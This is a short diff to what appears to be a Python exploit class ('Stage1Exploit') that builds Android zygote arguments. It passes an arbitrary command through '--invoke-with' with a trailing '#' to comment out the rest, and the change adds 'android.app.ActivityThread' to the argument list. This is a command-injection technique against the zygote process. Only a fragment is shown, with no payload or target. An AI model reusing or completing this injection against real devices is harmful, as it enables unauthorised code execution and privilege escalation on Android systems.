@@ -197,6 +197,7 @@ class Stage1Exploit:
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
+            "android.app.ActivityThread",
         ]
         zygote_arguments = "\n".join(
             [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
